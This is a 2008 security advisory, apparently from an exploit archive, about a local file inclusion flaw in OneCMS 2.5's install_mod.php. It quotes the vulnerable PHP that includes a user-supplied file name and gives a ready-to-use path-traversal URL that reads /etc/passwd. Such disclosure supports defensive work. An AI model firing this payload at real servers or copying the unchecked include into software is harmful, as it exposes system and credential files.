@@ -1,0 +1,60 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-034
+
+
+Application:                    OneCMS
+Versions Affected:              2.5
+Vendor URL:                     http://www.insanevisions.com/
+Bug:                            Local File Include
+Exploits:                       YES
+Reported:                       26.03.2008
+Vendor Response:                NONE
+Solution:                       NONE
+Date of Public Advisory:        23.05.2008
+Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Local File Include vulnerability found in script install_mod.php
+
+
+Code
+****
+#################################################
+
+ $mod = $_GET['load'];
+ $filexp = explode(".", $mod);
+ $filetype = $filexp[1];
+ $file = $filexp[0];
+ $file2 = "mods/$mod";
+
+ if (!is_numeric($mod)) { // makes sure that the user isnt entering a #
+ if ($filetype == "php") {
+ if ($_GET['act'] == "") {
+ echo "Are you sure you would like to install the <b>".$file."</b> module?<br><a href='install_mod.php?load=".$mod."&act=go'>Yes</a>";
+ }
+ if ($_GET['act'] == "go") {
+ include ($file2);
+ ...
+
+#################################################
+
+
+Example:
+
+http://[server]/[installdir]/install_mod.php?act=go&load=1234.php../../../../../../../../../../../../../etc/passwd
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:        research [at] dsec [dot] ru
+                http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-05-23]
